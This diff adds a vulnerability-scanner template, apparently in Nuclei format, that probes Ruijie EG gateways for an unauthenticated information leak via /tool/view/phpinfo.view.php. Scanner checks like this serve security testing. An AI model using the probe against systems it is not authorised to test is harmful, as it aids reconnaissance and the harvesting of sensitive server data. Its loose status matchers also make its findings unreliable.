@@ -1,0 +1,18 @@
+id: '---eg----phpinfo-view-php-------'
+info:
+  author: pocscanner
+  description: 锐捷EG易网关 部分版本 phpinfo.view.php文件权限设定存在问题，导致未经身份验证获取敏感信息
+  name: 锐捷 EG易网关 phpinfo.view.php 信息泄露漏洞
+  reference: []
+  severity: medium
+requests:
+- matchers:
+  - status:
+    - 200
+    - 301
+    - 302
+    - 403
+    type: status
+  method: GET
+  path:
+  - '{{BaseURL}}/tool/view/phpinfo.view.php'
